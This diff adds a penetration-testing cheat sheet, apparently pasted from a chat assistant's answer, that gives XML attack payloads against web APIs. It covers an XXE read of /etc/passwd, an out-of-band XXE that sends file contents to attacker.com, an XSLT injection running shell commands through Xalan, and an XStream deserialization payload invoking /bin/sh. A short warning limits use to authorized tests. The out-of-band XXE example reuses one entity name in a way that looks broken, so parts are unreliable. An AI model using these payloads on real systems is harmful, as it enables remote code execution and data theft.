@@ -1,0 +1,81 @@
+⚠️ Warning (Before Proceeding)
+These techniques should only be used in authorized environments like penetration tests, internal audits, or lab systems. Never scan or test systems you don’t own or have explicit permission to test.
+
+🧨 1. XXE-Based RCE (If file access leads to further exploitation)
+If the XML parser allows external entities, you can do:
+
+🔍 Basic XXE to confirm file read (Local File Inclusion)
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+➡️ Goal: Prove the parser allows file reads.
+
+🛰️ Out-of-Band XXE (OOB) for SSRF or RCE prep
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "http://attacker.com/malicious.dtd">
+  %file;
+]>
+<data>&send;</data>
+And on your attacker server (malicious.dtd):
+
+xml
+Copy
+Edit
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
+➡️ Goal: Exfiltrate files or test SSRF using your server logs.
+
+💥 2. XSLT Injection (Rare, but powerful)
+If the API uses XSLT transformation on user-supplied XML, you may get code execution.
+
+Example XSLT injection payload (Linux shell)
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+  <xsl:template match="/">
+    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
+    <xsl:variable name="process" select="rt:exec($rtObj, 'id')"/>
+    <xsl:variable name="res" select="ob:toString($process)"/>
+    <xsl:value-of select="$res"/>
+  </xsl:template>
+</xsl:stylesheet>
+➡️ Goal: Execute id or whoami and observe results in the API response.
+
+🧠 This only works if the XML parser uses Xalan or a similar engine that allows Java class references.
+
+🧨 3. Unsafe Deserialization via XML
+If the API deserializes XML into objects, try injecting Java or PHP objects (example: for vulnerable Java deserialization using XStream, JAXB, etc.).
+
+Example payload for Java XStream RCE:
+xml
+Copy
+Edit
+<java>
+  <object class="java.lang.ProcessBuilder">
+    <command>
+      <string>/bin/sh</string>
+      <string>-c</string>
+      <string>id > /tmp/output.txt</string>
+    </command>
+    <start/>
+  </object>
+</java>
+➡️ Goal: Execute command if backend uses unsafe XML deserialization.
+
+You must know the underlying deserialization library for this to work.
+
